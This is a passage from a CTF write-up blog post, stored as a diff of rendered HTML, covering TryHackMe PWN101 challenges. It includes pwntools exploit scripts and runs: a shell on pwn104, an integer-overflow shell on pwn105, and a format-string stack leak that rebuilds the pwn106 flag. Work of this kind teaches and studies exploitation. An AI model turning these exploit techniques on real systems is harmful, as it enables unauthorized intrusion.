+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the exploit</span>
+
+python3 get_shell.py REMOTE 10.10.145.112 9004
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9004: Done
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go <span class="k">for </span>a fight? 😏💪
+I<span class="s1">'m waiting for you at 
+[*] leaked_address : 0x7ffd64d5ffd0
+[*] Switching to interactive mode
+$ ls
+flag.txt
+pwn104
+pwn104.c
+$ cat flag.txt
+THM{fake_flag}   # get you own flag
+
+</span></code></pre></div></div>
+
+<h2 id="challenge-5---pwn105">Challenge 5 - pwn105</h2>
+<p>The challenge is running on port 9005</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
+
+file pwn105.pwn105    
+pwn105.pwn105: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>efe6d094462867e6b08e74de43fb7126e7b14ee4, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn105.pwn105 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall5/pwn105.pwn105'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+<span class="c"># Running Binary to get more info</span>
+
+./pwn105.pwn105 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+<span class="nt">-------</span><span class="o">=[</span> BAD INTEGERS <span class="o">]=</span><span class="nt">-------</span>
+|-&lt; Enter two numbers to add <span class="o">&gt;</span>-|
+
+<span class="o">]&gt;&gt;</span> 4
+<span class="o">]&gt;&gt;</span> 5
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ADDING 4 + 5
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> RESULT: 9
+
+</code></pre></div></div>
+
+<p>Ghidra analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn105.png" alt="pwn105.png" /></p>
+
+<p>So first it takes two inputs then check if the are +ve or not if they are not it tells you nice try else it will sum both the values and if the sum is less than 0 it pops a shell.</p>
+
+<p>Simple integer overflow can be done here as we know interger has range (-2,147,483,647 to 2,147,483,647) if we give the highest value and add something to it, the sum will go to the opposite side that is -ve one.</p>
+
+<p>lets try it out, it we enter 2147483647 and add 1 it theoretically it will become -2147483648</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.145.112 9005                        
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+<span class="nt">-------</span><span class="o">=[</span> BAD INTEGERS <span class="o">]=</span><span class="nt">-------</span>
+|-&lt; Enter two numbers to add <span class="o">&gt;</span>-|
+
+<span class="o">]&gt;&gt;</span> 2147483647
+<span class="o">]&gt;&gt;</span> 1
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> C: <span class="nt">-2147483648</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Popped Shell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nb">ls
+</span>flag.txt
+pwn105
+pwn105.c
+<span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+
+
+</code></pre></div></div>
+
+<h2 id="challenge-6---pwn106">Challenge 6 - pwn106</h2>
+<p>The challenge is running on port 9006</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file Checks</span>
+
+file pwn106user.pwn106-user 
+pwn106user.pwn106-user: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>60a1dfa10c02bcc6d113cb752053893ac9e2f4f1, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn106user.pwn106-user 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall6/pwn106user.pwn106-user'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+<span class="c"># Executing binary to get more info</span>
+
+./pwn106user.pwn106-user
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 107          
+
+🎉 THM Giveaway 🎉
+
+Enter your THM username to participate <span class="k">in </span>the giveaway: void
+
+Thanks void
+
+
+</code></pre></div></div>
+
+<p>Ghidra analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn106.png" alt="pwn106.png" /></p>
+
+<p>Here we can clearly see that it takes a input from us and then print it back to up … but here’s the twist as the programmer dosen’t specify format specifier we can provide our own format specifier to leak values from the stack.</p>
+
+<p>Our exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># chall6/get_flag.py 
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="s">""</span>
+
+<span class="c1"># Lets fuzzx values
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">12</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># connect to server
+</span>        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.145.112"</span><span class="p">,</span><span class="mi">9006</span><span class="p">,</span><span class="n">level</span><span class="o">=</span><span class="s">'warn'</span><span class="p">)</span>
+        <span class="c1"># io=process('./vuln',level='warn')
+</span>        <span class="c1"># Format the counter
+</span>        <span class="c1"># e.g %i$p will attempt to print [i]th pointer (or string/hex/char/int)
+</span>        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'%{}$p'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># Recieve the response (leaked addresses followed by '.' in this case)
+</span>        <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Thanks "</span><span class="p">)</span>
+        <span class="n">result</span><span class="o">=</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="sa">b</span><span class="s">'nil'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="c1"># Decode, reverse endianess and print
+</span>                <span class="n">decoded</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()[</span><span class="mi">2</span><span class="p">:])</span>
+                <span class="n">reversed_hex</span> <span class="o">=</span> <span class="n">decoded</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">reversed_hex</span><span class="p">))</span>
+                <span class="c1"># Build the flag
+</span>                <span class="n">flag</span><span class="o">+=</span><span class="n">reversed_hex</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
+            <span class="k">except</span> <span class="nb">BaseException</span><span class="p">:</span>
+                <span class="k">pass</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">EOFError</span><span class="p">:</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">info</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 get_flag.py
+6:b<span class="s1">'0x5f5530797b4d4854\n'</span>
+b<span class="s1">'THM{y0U_'</span>
+7:b<span class="s1">'0x5f3368745f6e3077\n'</span>
+b<span class="s1">'w0n_th3_'</span>
+8:b<span class="s1">'0x5961774133766947\n'</span>
+b<span class="s1">'Giv3AwaY'</span>
+9:b<span class="s1">'0x3168745f446e615f\n'</span>
+b<span class="s1">'_anD_th1'</span>
+10:b<span class="s1">'0x756f595f73315f73\n'</span>
+b<span class="s1">'s_1s_You'</span>
+11:b<span class="s1">'0x7d47346c665f52\n'</span>
+b<span class="s1">'R_fl4G}'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+
+
+</code></pre></div></div>
+
+<h2 id="challenge-7---pwn107">Challenge 7 - pwn107</h2>
+
+<p>The challenge is running on port 9007</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
+file pwn107.pwn107         
+pwn107.pwn107: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>0579b2a29d47165653fbb791fb528c59e951a1a0, not stripped
+
+checksec pwn107.pwn107         
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall7/pwn107.pwn107'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+
+</code></pre></div></div>
+
+<p>Comming soon…</p>
+:ET
